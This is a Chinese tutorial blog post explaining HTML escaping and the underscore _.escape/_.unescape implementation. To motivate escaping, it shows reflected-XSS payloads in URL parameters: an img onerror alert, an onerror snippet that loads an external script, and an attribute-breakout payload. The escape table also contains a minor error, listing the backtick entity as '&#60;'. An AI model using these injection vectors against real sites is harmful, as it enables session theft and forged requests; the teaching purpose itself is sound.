{"code":0,"data":"<h2>前言</h2>\n<p>underscore 提供了 <code>_.escape</code> 函数，用于转义 HTML 字符串，替换 &amp;, &lt;, &gt;, &quot;, ', 和 ` 字符为字符实体。</p>\n<pre><code class=\"language-js\">_.escape('Curly, Larry &amp; Moe');\n=&gt; &quot;Curly, Larry &amp;amp; Moe&quot;\n</code></pre>\n<p>underscore 同样提供了 <code>_.unescape</code> 函数，功能与 <code>_.escape</code> 相反：</p>\n<pre><code class=\"language-js\">_.unescape('Curly, Larry &amp;amp; Moe');\n=&gt; &quot;Curly, Larry &amp; Moe&quot;\n</code></pre>\n<h2>XSS 攻击</h2>\n<p>可是我们为什么需要转义 HTML 呢？</p>\n<p>举个例子，一个个人中心页的地址为：<code>www.example.com/user.html?name=kevin</code>，我们希望从网址中取出用户的名称，然后将其显示在页面中，使用 JavaScript，我们可以这样做：</p>\n<pre><code class=\"language-js\">/**\n * 该函数用于取出网址参数\n */\nfunction getQueryString(name) {\n    var reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;);\n    var r = window.location.search.substr(1).match(reg);\n    if (r != null) return unescape(r[2]);\n    return null;\n}\n\nvar name = getQueryString('name');\ndocument.getElementById(&quot;username&quot;).innerHTML = name;\n</code></pre>\n<p>如果被一个同样懂技术的人发现的话，那么他可能会动点“坏心思”：</p>\n<p>比如我把这个页面的地址修改为：<code>www.example.com/user.html?name=&lt;script&gt;alert(1)&lt;/script&gt;</code>。</p>\n<p>就相当于:</p>\n<pre><code class=\"language-js\">document.getElementById(&quot;username&quot;).innerHTML = '&lt;script&gt;alert(1)&lt;/script&gt;';\n</code></pre>\n<p>会有什么效果呢？</p>\n<p>结果是什么也没有发生……</p>\n<p>这是因为:</p>\n<blockquote>\n<p>根据 W3C 规范，script 标签中所指的脚本仅在浏览器第一次加载页面时对其进行解析并执行其中的脚本代码，所以通过 innerHTML 方法动态插入到页面中的 script 标签中的脚本代码在所有浏览器中默认情况下均不能被执行。</p>\n</blockquote>\n<p>千万不要以为这样就安全了……</p>\n<p>你把地址改成 <code>www.example.com/user.html?name=&lt;img src=@ onerror=alert(1)&gt;</code> 的话，就相当于：</p>\n<pre><code class=\"language-js\">document.getElementById(&quot;d1&quot;).innerHTML=&quot;&lt;img src=@ onerror=alert(1)&gt;&quot;\n</code></pre>\n<p>此时立刻就弹窗了 1。</p>\n<p>也许你会想，不就是弹窗个 1 吗？还能怎么样？能写多少代码？</p>\n<p>那我把地址改成 <code>www.example.com/user.html?name=&lt;img src=@ onerror='var s=document.createElement(&quot;script&quot;);s.src=&quot;https://mqyqingfeng.github.io/demo/js/alert.js&quot;;document.body.appendChild(s);' /&gt;</code> 呢？</p>\n<p>就相当于：</p>\n<pre><code class=\"language-js\">document.getElementById(&quot;username&quot;).innerHTML = &quot;&lt;img src=@ onerror='var s=document.createElement(\\&quot;script\\&quot;);s.src=\\&quot;https://mqyqingfeng.github.io/demo/js/alert.js\\&quot;;document.body.appendChild(s);' /&gt;&quot;;\n</code></pre>\n<p>整理下其中 onerror 的代码：</p>\n<pre><code class=\"language-js\">var s = document.createElement(&quot;script&quot;);\ns.src = &quot;https://mqyqingfeng.github.io/demo/js/alert.js&quot;;\ndocument.body.appendChild(s);\n</code></pre>\n<p>代码中引入了一个第三方的脚本，这样做的事情就多了，从取你的 cookie，发送到黑客自己的服务器，到监听你的输入，到发起 CSRF 攻击，直接以你的身份调用网站的各种接口……</p>\n<p>总之，很危险。</p>\n<p>为了防止这种情况的发生，我们可以将网址上的值取到后，进行一个特殊处理，再赋值给 DOM 的 innerHTML。</p>\n<h2>字符实体</h2>\n<p>问题是怎么进行转义呢？而这就要谈到字符实体的概念了。</p>\n<p>在 HTML 中，某些字符是预留的。比如说在 HTML 中不能使用小于号（&lt;）和大于号（&gt;），因为浏览器会误认为它们是标签。</p>\n<p>如果希望正确地显示预留字符，我们必须在 HTML 源代码中使用字符实体（character entities）。</p>\n<p>字符实体有两种形式：</p>\n<ol>\n<li><code>&amp;entity_name;</code></li>\n<li><code>&amp;#entity_number;</code>。</li>\n</ol>\n<p>比如说我们要显示小于号，我们可以这样写：<code>&amp;lt;</code> 或 <code>&amp;#60</code>;</p>\n<p>值得一提的是，使用实体名而不是数字的好处是，名称易于记忆。不过坏处是，浏览器也许并不支持所有实体名称（但是对实体数字的支持却很好）。</p>\n<p>也许你会好奇，为什么 <code>&lt;</code> 的字符实体是 <code>&amp;#60</code> 呢？这是怎么进行计算的呢？</p>\n<p>其实很简单，就是取字符的 unicode 值，以 <code>&amp;#</code> 开头接十进制数字 或者以 <code>&amp;#x</code>开头接十六进制数字。举个例子：</p>\n<pre><code class=\"language-js\">var num = '&lt;'.charCodeAt(0); // 60\nnum.toString(10) // '60'\nnum.toString(16) // '3c'\n</code></pre>\n<p>我们可以以 <code>&amp;#60;</code> 或者 <code>&amp;#x3c;</code> 在 HTML 中表示出 <code>&lt;</code>。</p>\n<p>不信你可以写这样一段 HTML，显示的效果都是 <code>&lt;</code>：</p>\n<pre><code class=\"language-html\">&lt;div&gt;&amp;lt;&lt;/div&gt;\n&lt;div&gt;&amp;#60;&lt;/div&gt;\n&lt;div&gt;&amp;#x3c;&lt;/div&gt;\n</code></pre>\n<p>再举个例子：以字符 '喵' 为例：</p>\n<pre><code class=\"language-js\">var num = '喵'.charCodeAt(0); // 21941\nnum.toString(10) // '21941'\nnum.toString(16) // '55b5'\n</code></pre>\n<p>在 HTML 中，我们就可以用 <code>&amp;#21941;</code> 或者 <code>&amp;#x55b5</code> 表示<code>喵</code>，不过“喵”并不具有实体名。</p>\n<h2>转义</h2>\n<p>我们的应对方式就是将取得的值中的特殊字符转为字符实体。</p>\n<p>举个例子，当页面地址是 <code>www.example.com/user.html?name=&lt;strong&gt;123&lt;/strong&gt;</code>时，我们通过 getQueryString 取得 name 的值：</p>\n<pre><code class=\"language-js\">var name = getQueryString('name'); // &lt;strong&gt;123&lt;/strong&gt;\n</code></pre>\n<p>如果我们直接：</p>\n<pre><code class=\"language-js\">document.getElementById(&quot;username&quot;).innerHTML = name;\n</code></pre>\n<p>如我们所知，使用 innerHTML 会解析内容字符串，并且改变元素的 HMTL 内容，最终，从样式上，我们会看到一个加粗的 123。</p>\n<p>如果我们转义，将 <code>&lt;strong&gt;123&lt;/strong&gt;</code> 中的 <code>&lt;</code> 和 <code>&gt;</code> 转为实体字符，即 <code>&amp;lt;strong&amp;gt;123&amp;lt;/strong&amp;gt;</code>，我们再设置 innerHTML，浏览器就不会将其解释为标签，而是一段字符，最终会直接显示 <code>&lt;strong&gt;123&lt;/strong&gt;</code>，这样就避免了潜在的危险。</p>\n<h2>思考</h2>\n<p>那么问题来了，我们具体要转义哪些字符呢？</p>\n<p>想想我们之所以要转义 <code>&lt;</code> 和 <code>&gt;</code> ，是因为浏览器会将其认为是一个标签的开始或结束，所以要转义的字符一定是浏览器会特殊对待的字符，那还有什么字符会被特殊对待的呢？(O_o)??</p>\n<p><code>&amp;</code> 是一个，因为浏览器会认为 <code>&amp;</code> 是一个字符实体的开始，如果你输入了 <code>&amp;lt;</code>，浏览器会将其解释为 <code>&lt;</code>，但是当 <code>&amp;lt;</code> 是作为用户输入的值时，应该仅仅是显示用户输入的值，而不是将其解释为一个 <code>&lt;</code>。</p>\n<p><code>'</code> 和 <code>&quot;</code> 也要注意，举个例子：</p>\n<p>服务器端渲染的代码为：</p>\n<pre><code class=\"language-js\">function render (input) {\n  return '&lt;input type=&quot;name&quot; value=&quot;' + input + '&quot;&gt;'\n}\n</code></pre>\n<p>input 的值如果直接来自于用户的输入，用户可以输入 <code>&quot;&gt; &lt;script&gt;alert(1)&lt;/script&gt;</code>，最终渲染的 HTML 代码就变成了：</p>\n<pre><code class=\"language-html\">&lt;input type=&quot;name&quot; value=&quot;&quot;&gt; &lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;\n</code></pre>\n<p>结果又是一次 XSS 攻击……</p>\n<p>最后还有一个是反引号 `，在 IE 低版本中(≤ 8)，反引号可以用于关闭标签：</p>\n<pre><code>&lt;img src=&quot;x` `&lt;script&gt;alert(1)&lt;/script&gt;&quot;` `&gt;\n</code></pre>\n<p>所以我们最终确定的要转义的字符为：&amp;, &lt;, &gt;, &quot;, ', 和 `。转义对应的值为：</p>\n<pre><code>&amp; --&gt; &amp;amp;\n&lt; --&gt; &amp;lt;\n&gt; --&gt; &amp;gt;\n&quot; --&gt; &amp;quot;\n' --&gt; &amp;#x27;\n` --&gt; &amp;#60;\n</code></pre>\n<p>值得注意的是：单引号和反引号使用是实体数字、而其他使用的是实体名称，这主要是从兼容性的角度考虑的，有的浏览器并不能很好的支持单引号和反引号的实体名称。</p>\n<h2>_.escape</h2>\n<p>那么具体我们该如何实现转义呢？我们直接看一个简单的实现：</p>\n<pre><code class=\"language-js\">var _ = {};\n\nvar escapeMap = {\n    '&amp;': '&amp;amp;',\n    '&lt;': '&amp;lt;',\n    '&gt;': '&amp;gt;',\n    '&quot;': '&amp;quot;',\n    &quot;'&quot;: '&amp;#x27;',\n    '`': '&amp;#x60;'\n};\n\n_.escape = function(string) {\n    var escaper = function(match) {\n        return escapeMap[match];\n    };\n    // 使用非捕获性分组\n    var source = '(?:' + Object.keys(escapeMap).join('|') + ')';\n    console.log(source) // (?:&amp;|&lt;|&gt;|&quot;|'|`)\n    var testRegexp = RegExp(source);\n    var replaceRegexp = RegExp(source, 'g');\n\n    string = string == null ? '' : '' + string;\n    return testRegexp.test(string) ? string.replace(replaceRegexp, escaper) : string;\n}\n</code></pre>\n<p>实现的思路很简单，构造一个正则表达式，先判断是否能匹配到，如果能匹配到，就执行 replace，根据 escapeMap 将特殊字符进行替换，如果不能匹配，说明不需要转义，直接返回原字符串。</p>\n<p>值得一提的是，我们在代码中打印了构造出的正则表达式为：</p>\n<pre><code>(?:&amp;|&lt;|&gt;|&quot;|'|`)\n</code></pre>\n<p>其中的 <code>?:</code> 是个什么意思？没有这个 <code>?:</code> 就不可以匹配吗？我们接着往下看。</p>\n<h2>非捕获分组</h2>\n<p><code>(?:pattern)</code> 表示非捕获分组，即会匹配 pattern 但不获取匹配结果，不进行存储供以后使用。</p>\n<p>我们来看个例子：</p>\n<pre><code class=\"language-js\">function replacer(match, p1, p2, p3) {\n    // match，表示匹配的子串 abc12345#$*%\n    // p1，第 1 个括号匹配的字符串 abc\n    // p2，第 2 个括号匹配的字符串 12345\n    // p3，第 3 个括号匹配的字符串 #$*%\n    return [p1, p2, p3].join(' - ');\n}\nvar newString = 'abc12345#$*%'.replace(/([^\\d]*)(\\d*)([^\\w]*)/, replacer); // abc - 12345 - #$*%\n</code></pre>\n<p>现在我们给第一个括号中的表达式加上 <code>?:</code>，表示第一个括号中的内容不需要储存结果：</p>\n<pre><code class=\"language-js\">function replacer(match, p1, p2) {\n    // match，表示匹配的子串 abc12345#$*%\n    // p1，现在匹配的是字符串 12345\n    // p1，现在匹配的是字符串 #$*%\n    return [p1, p2].join(' - ');\n}\nvar newString = 'abc12345#$*%'.replace(/(?:[^\\d]*)(\\d*)([^\\w]*)/, replacer); // 12345 - #$*%\n</code></pre>\n<p>在 <code>_.escape</code> 函数中，即使不使用 <code>?:</code> 也不会影响匹配结果，只是使用 <code>?:</code> 性能会更高一点。</p>\n<h2>反转义</h2>\n<p>我们使用了 <code>_.escape</code> 将指定字符转为字符实体，我们还需要一个方法将字符实体转义回来。</p>\n<p>写法与 <code>_.unescape</code> 类似：</p>\n<pre><code class=\"language-js\">var _ = {};\n\nvar unescapeMap = {\n    '&amp;amp;': '&amp;',\n    '&amp;lt;': '&lt;',\n    '&amp;gt;': '&gt;',\n    '&amp;quot;': '&quot;',\n    '&amp;#x27;': &quot;'&quot;,\n    '&amp;#x60;': '`'\n};\n\n_.unescape = function(string) {\n    var escaper = function(match) {\n        return unescapeMap[match];\n    };\n    // 使用非捕获性分组\n    var source = '(?:' + Object.keys(unescapeMap).join('|') + ')';\n    console.log(source) // (?:&amp;|&lt;|&gt;|&quot;|'|`)\n    var testRegexp = RegExp(source);\n    var replaceRegexp = RegExp(source, 'g');\n\n    string = string == null ? '' : '' + string;\n    return testRegexp.test(string) ? string.replace(replaceRegexp, escaper) : string;\n}\n\nconsole.log(_.unescape('Curly, Larry &amp;amp; Moe')) // Curly, Larry &amp; Moe\n</code></pre>\n<h2>抽象</h2>\n<p>你会不会觉得 <code>_.escape</code> 与 <code>_.unescape</code> 的代码实在是太像了，以至于让人感觉很冗余呢？</p>\n<p>那么我们又该如何优化呢？</p>\n<p>我们可以先写一个 <code>_.invert</code> 函数，将 escapeMap 传入的时候，可以得到 unescapeMap，然后我们再根据传入的 map (escapeMap 或者 unescapeMap) 不同，返回不同的函数。</p>\n<p>实现的方式很简单，直接看代码：</p>\n<pre><code class=\"language-js\">/**\n * 返回一个object副本，使其键（keys）和值（values）对换。\n * _.invert({a: &quot;b&quot;});\n * =&gt; {b: &quot;a&quot;};\n */\n_.invert = function(obj) {\n    var result = {};\n    var keys = Object.keys(obj);\n    for (var i = 0, length = keys.length; i &lt; length; i++) {\n        result[obj[keys[i]]] = keys[i];\n    }\n    return result;\n};\n\nvar escapeMap = {\n    '&amp;': '&amp;amp;',\n    '&lt;': '&amp;lt;',\n    '&gt;': '&amp;gt;',\n    '&quot;': '&amp;quot;',\n    &quot;'&quot;: '&amp;#x27;',\n    '`': '&amp;#x60;'\n};\nvar unescapeMap = _.invert(escapeMap);\n\nvar createEscaper = function(map) {\n    var escaper = function(match) {\n        return map[match];\n    };\n    // 使用非捕获性分组\n    var source = '(?:' + _.keys(map).join('|') + ')';\n    var testRegexp = RegExp(source);\n    var replaceRegexp = RegExp(source, 'g');\n    return function(string) {\n        string = string == null ? '' : '' + string;\n        return testRegexp.test(string) ? string.replace(replaceRegexp, escaper) : string;\n    };\n};\n\n_.escape = createEscaper(escapeMap);\n_.unescape = createEscaper(unescapeMap);\n</code></pre>\n<h2>underscore 系列</h2>\n<p>underscore 系列目录地址：<a href=\"https://github.com/mqyqingfeng/Blog\">https://github.com/mqyqingfeng/Blog</a>。</p>\n<p>underscore 系列预计写八篇左右，重点介绍 underscore 中的代码架构、链式调用、内部函数、模板引擎等内容，旨在帮助大家阅读源码，以及写出自己的 undercore。</p>\n<p>如果有错误或者不严谨的地方，请务必给予指正，十分感谢。如果喜欢或者有所启发，欢迎 star，对作者也是一种鼓励。</p>\n"}